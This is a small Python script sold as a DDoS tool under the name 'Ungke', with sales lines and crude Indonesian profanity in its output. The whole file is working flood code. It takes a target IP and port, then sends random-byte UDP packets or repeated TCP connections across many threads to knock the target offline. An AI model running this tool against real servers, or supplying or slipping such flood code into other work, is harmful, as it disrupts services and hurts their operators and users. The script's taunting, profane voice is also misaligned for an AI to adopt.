#!/usr/bin/env python3
#Jual 45k
#Ddos by Ungke
#Join My Comunity Store Ungke 
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtackByUngke")
print("Jual 40 Ribu")
print("Mau rename? Pm Ungke")
ip = str(input(" DdosAttackByUngke | Ip:"))
port = int(input(" DdosAttackByUngke | Port:"))
choice = str(input(" DdosAttackByUngke | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByUngke | Packets:"))
threads = int(input(" DdosAttackByUngke | Threads:"))
def run():
	data = random._urandom(100000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Ungke |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Ungke nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()